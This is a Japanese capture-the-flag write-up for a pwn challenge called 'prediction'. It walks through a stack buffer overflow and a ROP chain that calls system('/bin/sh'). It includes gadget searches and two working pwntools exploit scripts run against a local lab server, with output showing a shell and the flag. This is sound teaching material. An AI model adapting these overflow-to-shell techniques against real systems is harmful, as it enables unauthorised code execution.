## 事前知識
### ROP
Return Oriented Programmingの略で、小さな命令を組み合わせて色々とやる方法です。wani-hackaseのnop func callが勉強用に素晴らしいのでぜひ参照してみてください。

https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/06-rop-func-call#%E8%A7%A3%E6%B3%95

### checksec

```bash
$ checksec dist/prediction
[*] '/home/user/work/taskctf21-public/pwn/prediction/dist/prediction'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## 方針
- system, binshのアドレスを見つける
- `pop rdi`と`pop rdi`を探す
- 組み立てる

## 解法
サーバの起動

```bash
docker-compose up -d
```

### systeとbinshが配置されたアドレスを見つける

```bash
$ objdump -d -M intel dist/prediction  | grep system
0000000000401120 <system@plt>:
  401124:       f2 ff 25 15 2f 00 00    bnd jmp QWORD PTR [rip+0x2f15]        # 404040 <system@GLIBC_2.2.5>
  4013fe:       e8 1d fd ff ff          call   401120 <system@plt>
$ objdump -d -M intel dist/prediction  | grep binsh
  4013f7:       48 8d 3d 7a 2c 00 00    lea    rdi,[rip+0x2c7a]        # 404078 <binsh>
```

### pop rdiとpop rsiが配置されたアドレスを見つける

```bash
$ ROPgadget --binary ./dist/prediction  | grep "pop rdi"
0x0000000000401493 : pop rdi ; ret
$ ROPgadget --binary ./dist/prediction  | grep "pop rsi"
0x0000000000401491 : pop rsi ; pop r15 ; ret
```

### exploit

```python
from pwn import *

io = remote("127.0.0.1", 30006)

print(io.readuntil("?"))

addr_system_plt = 0x401120
addr_binsh = 0x404078
addr_pop_rdi = 0x401493
addr_pop_rsi_pop = 0x401491

s = b"taskctf{" + b"A" * 48
s += p64(addr_pop_rdi)
s += p64(addr_binsh)
s += p64(addr_pop_rsi_pop)
s += p64(0)
s += p64(0)
s += p64(addr_system_plt)

io.sendline(s)
io.interactive()

"""
$ python3 solver/solve.py 
[+] Opening connection to 127.0.0.1 on port 30006: Done
/home/user/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:1433: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  return func(self, *a, **kw)
b'What is the flag?'
[*] Switching to interactive mode

***start stack dump***
0x7fffffffebd0: 0x7b6674636b736174 <- rsp
0x7fffffffebd8: 0x4141414141414141
0x7fffffffebe0: 0x4141414141414141
0x7fffffffebe8: 0x4141414141414141
0x7fffffffebf0: 0x4141414141414141
0x7fffffffebf8: 0x4141414141414141
0x7fffffffec00: 0x4141414141414141 <- rbp
0x7fffffffec08: 0x0000000000401493 <- return address
0x7fffffffec10: 0x0000000000404078
0x7fffffffec18: 0x0000000000401491
0x7fffffffec20: 0x0000000000000000
***end stack dump***

$ ls
flag
prediction
start.sh
$ cat flag
taskctf{r0p_1s_f4mous_way}$ 
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 30006
"""
```

### 解法2
`system(binsh)`を読んでいる行があるので、そこに飛ばせば良かったですね......


```python
from pwn import *

io = remote("127.0.0.1", 30006)

print(io.readuntil("?"))

s = b"taskctf{" + b"A" * 48
s += p64(0x4013f7)

io.sendline(s)
io.interactive()

"""
$ python3 solver/solve2.py 
[+] Opening connection to 127.0.0.1 on port 30006: Done
/home/user/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:1433: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  return func(self, *a, **kw)
b'What is the flag?'
[*] Switching to interactive mode

***start stack dump***
0x7fffffffebd0: 0x7b6674636b736174 <- rsp
0x7fffffffebd8: 0x4141414141414141
0x7fffffffebe0: 0x4141414141414141
0x7fffffffebe8: 0x4141414141414141
0x7fffffffebf0: 0x4141414141414141
0x7fffffffebf8: 0x4141414141414141
0x7fffffffec00: 0x4141414141414141 <- rbp
0x7fffffffec08: 0x00000000004013f7 <- return address
0x7fffffffec10: 0x0000000000000000
0x7fffffffec18: 0x00007ffff7df50b3
0x7fffffffec20: 0x00007ffff7fba6a0
***end stack dump***

$ ls
flag
prediction
start.sh
$ cat flag
taskctf{r0p_1s_f4mous_way}$ 
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 30006
"""
```

## コメント
ROPを想定した問題でしたが、ログを見ているとsystem(binsh)のアドレスに飛ばしている方も多いようでした。

余談ですが、実はこの問題はbinshをbinlsにした上で、fsbでbinlsを書き換える問題にしようと思っていました。しかし、僕がPoCを書けなかったのでこの形態になりました。来年出すかもしれないですね。
